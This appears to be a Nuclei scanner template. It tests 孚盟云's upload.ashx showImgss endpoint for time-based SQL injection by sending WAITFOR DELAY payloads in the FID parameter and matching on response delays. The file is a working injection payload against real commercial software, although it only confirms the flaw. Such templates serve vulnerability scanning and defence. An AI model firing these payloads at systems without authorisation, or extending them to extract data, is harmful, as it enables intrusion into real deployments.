id: fumengyun-upload_ashx-showImgss-sql-time

info:
  name: 孚盟云 upload.ashx showImgss SQL延时注入漏洞
  author: fumengyun
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        GET /Ajax/upload.ashx?action=showImgss&FID=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /Ajax/upload.ashx?action=showImgss&FID=1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and